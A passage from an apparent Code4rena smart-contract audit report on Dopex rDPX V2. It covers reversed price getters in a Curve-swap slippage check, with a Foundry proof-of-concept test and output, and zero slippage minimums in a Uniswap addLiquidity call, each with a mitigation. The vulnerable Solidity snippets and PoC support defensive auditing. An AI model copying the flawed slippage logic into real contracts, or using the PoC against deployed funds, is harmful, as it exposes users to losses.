class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // transfer the lp to the amo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IERC20WithBurn(addresses.pair).safeTransfer(addresses.amo, lp);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IUniV2LiquidityAmo(addresses.amo).sync();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // transfer rdpx to rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IERC20WithBurn(addresses.tokenA).safeTransfer(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      addresses.rdpxV2Core,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      IERC20WithBurn(addresses.tokenA).balanceOf(address(this))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IRdpxV2Core(addresses.rdpxV2Core).sync();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1805#issuecomment-1734296343\">psytama (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-05-_curveswap-getdpxethprice-and-getethprice-is-in-wrong-order\" style=\"position:relative;\"><a href=\"#m-05-_curveswap-getdpxethprice-and-getethprice-is-in-wrong-order\" aria-label=\"m 05 _curveswap getdpxethprice and getethprice is in wrong order permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1558\">[M-05] _curveSwap: getDpxEthPrice and getEthPrice is in wrong order</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1558\">QiuhaoLi</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2164\">0xvj</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2096\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1802\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1613\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1399\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1023\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/970\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/854\">said</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/786\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/608\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/602\">SBSecurity</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1827\">wintermute</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1416\">pep7siup</a></em></p>\n<p>When <code>_curveSwap</code> is called with <code>minAmount = 0</code> (upperDepeg/lowerDepeg use the default slippage 0.5%), the <code>minOut</code> will be a wrong value which leads to slippage protect failure.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In <code>_curveSwap</code>, the getDpxEthPrice and getEthPrice is in wrong order:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_ethToDpxEth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ? (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">slippageTolerance</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      : (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getEthPrice</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getEthPrice</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">slippageTolerance</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>When <code>_ethToDpxEth</code> is true, we swap eth for dpxeth. However, we use getDpxEthPrice, which is dpxeth’s price in eth (dpxeth/eth). Also, when we swap dpxeth for eth, we use getEthPrice which is eth’s price in dpxeth.</p>\n<p>Below is a PoC that demonstrates we get the wrong slippage when calling <code>upperDepeg</code> with default slippage tolerance:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// add this to _curveSwap</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dpxEthCurvePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_ethToDpxEth</span><span class=\"mtk1\"> ? </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">a</span><span class=\"mtk1\">)) : </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_ethToDpxEth</span><span class=\"mtk1\"> ? </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">b</span><span class=\"mtk1\">)) : </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">a</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">minAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">minAmount</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_ethToDpxEth</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;getDpxEthPrice = %s &gt; 1e8, swap %s dpxEth for Eth (0.5% slippage):&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minOut (wrong slippage) = </span><span class=\"mtk6\">\\t</span><span class=\"mtk8\">%s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ideal_Out</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">correct_minOut</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">ideal_Out</span><span class=\"mtk1\"> - (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">slippageTolerance</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minOut (correct slippage) = </span><span class=\"mtk6\">\\t</span><span class=\"mtk8\">%s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">correct_minOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Actual got Eth amountOut = </span><span class=\"mtk6\">\\t</span><span class=\"mtk8\">%s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Actual slippage = </span><span class=\"mtk6\">\\t\\t</span><span class=\"mtk8\">%s% &gt; 0.5%&quot;</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">ideal_Out</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">)*</span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ideal_Out</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// tests/rdpxV2-core/Unit.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function testUpperDepeg_default_slippageTolerance() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // swap weth for dpxETH (price after swap 180000000)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    dpxETH.approve(address(curvePool), 200 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address coin0 = IStableSwap(curvePool).coins(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (coin0 == address(weth)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      IStableSwap(curvePool).exchange(0, 1, 200 * 1e18, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      IStableSwap(curvePool).exchange(1, 0, 200 * 1e18, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // dpxEth : Eth = 1.8 : 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    dpxEthPriceOracle.updateDpxEthPrice(180000000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // mint dpxEth and swap for Eth, using default slippage (0.5%)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpxV2Core.upperDepeg(10e18, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">$ forge test -vv --match-test &quot;testUpperDepeg_default_slippageTolerance&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for tests/rdpxV2-core/Unit.t.sol:Unit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testUpperDepeg_default_slippageTolerance() (gas: 246264)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  getDpxEthPrice = 180000000 &gt; 1e8, swap 10000000000000000000 dpxEth for Eth (0.5% slippage):</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  minOut (wrong slippage) =     5527777722500000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  minOut (correct slippage) =   17910000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Actual got Eth amountOut =    15885460869832720611</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Actual slippage =             11% &gt; 0.5%</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Reverse the order:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_ethToDpxEth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ? (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getEthPrice</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">getEthPrice</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">slippageTolerance</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      : (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getDpxEthPrice</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">slippageTolerance</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/970\">psytama (Dopex) confirmed via duplicate issue 970</a></strong></p>\n<hr>\n<h2 id=\"m-06-missing-slippage-parameter-on-uniswap-addliquidity-function\" style=\"position:relative;\"><a href=\"#m-06-missing-slippage-parameter-on-uniswap-addliquidity-function\" aria-label=\"m 06 missing slippage parameter on uniswap addliquidity function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1032\">[M-06] Missing slippage parameter on Uniswap <code>addLiquidity()</code> function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1032\">juancito</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2179\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1686\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1542\">RED-LOTUS-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1380\">0xmuxyz</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1259\">ciphermarco</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1135\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/986\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/679\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/633\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/587\">ArmedGoose</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/71\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/223\">ginlee</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1983\">mitko1111</a></em></p>\n<p>The Uniswap <code>addLiquidity()</code> function expects the slippage params <code>amountAMin</code>, and <code>amountBMin</code> to be passed.</p>\n<p>The <code>reLP()</code> sets those values as <code>0</code>, which in other terms, means that the contract is ok with receiveing less amount of tokens than the fair market price when providing liquidity.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Less LP tokens will be received during the <code>reLP()</code> call, as it will accept any amount of tokens while adding liquidity to Uniswap.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>reLP()</code> is used by the bond functions, and uses <code>0</code> for the <code>amountAMin</code>, and <code>amountBMin</code> values passed to the <code>addLiquidity()</code> function on the Uniswap router:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lp</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IUniswapV2Router</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenB</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenAAmountOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amountB</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                    </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,                    </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/reLP/ReLPContract.sol#L286-L295\">ReLPContract.sol#L286-L295</a></li>\n<li><a href=\"https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidity\">addLiquidity() on Uniswap</a></li>\n</ul>\n<p>This will make the function return less lp tokens than expected, while rebalancing.</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Set the <code>amountAMin</code> and <code>amountBMin</code> parameters to the expected minimum values.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1032#issuecomment-1734120992\">psytama (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-07-the-owner-of-rpdx-decaying-bonds-is-not-updated-on-token-transfers\" style=\"position:relative;\"><a href=\"#m-07-the-owner-of-rpdx-decaying-bonds-is-not-updated-on-token-transfers\" aria-label=\"m 07 the owner of rpdx decaying bonds is not updated on token transfers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a 